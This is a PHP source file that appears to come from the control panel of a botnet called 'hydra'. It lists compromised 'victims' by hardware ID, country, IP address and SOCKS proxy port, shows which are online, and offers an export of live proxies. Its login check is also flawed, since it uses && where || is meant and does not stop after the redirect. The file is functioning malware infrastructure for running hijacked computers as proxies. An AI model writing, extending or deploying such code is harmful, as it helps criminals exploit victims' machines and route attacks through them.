<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
	include("inc/config.php");
	include("inc/funcs.php");
	$table = '<div class="padding"><h2>Logs</h2>';
	$table .= '<table class="smalltable" style="margin: 5px; width: 590px;"><tr>
	<th>Hardware-ID</th>
	<th>Country</th>
	<th>IP</th>
	<th>Port</th>
	<th>Status</th>
	</tr>';

	$query = mysql_query("SELECT * FROM hydra_socks");
	while($ds = mysql_fetch_array($query))
	{
		$query2 = mysql_query("SELECT * FROM hydra_victims WHERE HWID = '".mysql_real_escape_string($ds['hwid'])."' AND ConTime > ".(time()-$time_on)."");
		$socks_online = mysql_num_rows($query2);
		if($socks_online >= 1) {
			$status = '<span class="green">Online</span>';
		} else {
			$status = '<span class="red">Offline</span>';
		}
		$table .= '<tr><td>'.$ds['hwid'].'</td><td><img src="images/icons/flags/'.strtolower($ds['country']).'.png" alt="flag"/></td><td>'.$ds['ip'].'</td><td>'.$ds['port'].'</td><td>'.$status.'</td></tr>';
	}
	$table .= '</table><br /><span style="float: right;"><a href="#" onClick="exportSocks();">Export online Socks</a></span></div>';
	echo $table;
?>